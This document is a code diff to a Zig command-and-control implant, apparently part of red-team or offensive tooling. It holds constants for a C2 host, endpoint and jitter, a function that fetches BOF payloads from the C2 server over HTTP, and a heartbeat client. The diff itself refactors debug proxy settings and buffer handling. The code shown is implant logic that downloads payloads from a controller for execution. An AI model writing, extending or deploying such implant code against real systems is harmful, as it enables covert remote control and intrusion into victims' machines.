@@ -6,31 +6,36 @@ pub const std_options = struct {
     pub const http_disable_tls = true;
     pub const log_level = .info;
 };
-const enable_debug_http_proxy = true;
 const c2_host = "127.0.0.1:8000";
 const c2_endpoint = "/endpoint";
 const jitter = 3;
 
+const debug_proxy_enabled = false;
+const debug_proxy_host = "127.0.0.1";
+const debug_proxy_port = 8080;
+
 fn fetchBofContent(allocator: std.mem.Allocator, bof_uri: []const u8) ![]const u8 {
-    var h = std.http.Headers{ .allocator = allocator };
-    defer h.deinit();
+    var headers = std.http.Headers{ .allocator = allocator };
+    defer headers.deinit();
 
     var http_client: std.http.Client = .{
         .allocator = allocator,
-        .http_proxy = if (enable_debug_http_proxy) .{
+        .http_proxy = if (debug_proxy_enabled) .{
             .allocator = allocator,
-            .headers = h,
+            .headers = headers,
             .protocol = .plain,
-            .host = "127.0.0.1",
-            .port = 8080,
+            .host = debug_proxy_host,
+            .port = debug_proxy_port,
         } else null,
     };
     defer http_client.deinit();
 
-    var buf: [256]u8 = undefined;
-    const uri = try std.fmt.bufPrint(&buf, "http://{s}{s}", .{ c2_host, bof_uri });
+    const uri = try std.fmt.allocPrint(allocator, "http://{s}{s}", .{ c2_host, bof_uri });
+    defer allocator.free(uri);
+
     const bof_url = try std.Uri.parse(uri);
-    var bof_req = try http_client.open(.GET, bof_url, h, .{});
+
+    var bof_req = try http_client.open(.GET, bof_url, headers, .{});
     defer bof_req.deinit();
 
     try bof_req.send(.{});
@@ -83,12 +88,12 @@ const State = struct {
 
         const http_client: std.http.Client = .{
             .allocator = allocator,
-            .http_proxy = if (enable_debug_http_proxy) .{
+            .http_proxy = if (debug_proxy_enabled) .{
                 .allocator = allocator,
                 .headers = heartbeat_header,
                 .protocol = .plain,
-                .host = "127.0.0.1",
-                .port = 8080,
+                .host = debug_proxy_host,
+                .port = debug_proxy_port,
             } else null,
         };
 
